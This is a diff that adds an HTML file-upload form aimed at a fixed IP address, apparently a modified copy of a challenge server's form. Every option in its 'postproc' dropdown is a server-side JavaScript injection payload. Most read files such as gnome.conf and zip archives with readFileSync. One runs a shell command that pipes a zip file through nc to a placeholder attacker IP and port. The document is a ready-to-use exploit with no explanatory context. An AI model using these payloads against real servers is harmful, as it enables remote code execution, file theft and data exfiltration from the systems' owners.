@@ -1,0 +1,14 @@
+<h2>Upload New File</h2>
+<form action="http://52.192.152.132/files" method="post" role="form" enctype="multipart/form-data">
+  <h4>Post-process:</h4>
+  <select required name="postproc">
+    <option value="res.end(require('fs').readFileSync('/gnome/www/files/gnome.conf'))">gnome.conf</option>
+    <option value="res.end(require('fs').readFileSync('/gnome/www/files/sgnet.zip'))">sgnet.zip</option>
+    <option value="res.end(require('fs').readFileSync('/gnome/www/files/20151203133815.zip'))">20151203133815.zip</option>
+    <option value="res.end(require('fs').readFileSync('/gnome/www/files/factory_cam_4.zip'))">factory_cam_4.zip</option>
+    <option value="res.send(require('child_process').execSync('cat /gnome/www/files/factory_cam_4.zip | nc YOUR_PUBLIC_IP YOUR_PUBLIC_PORT'))">factory_cam_4_nc</option>
+  </select>
+  <h4>Choose a file:</h4>
+  <input required name="file" type="file">
+  <button type="submit">Upload</button>
+</form>
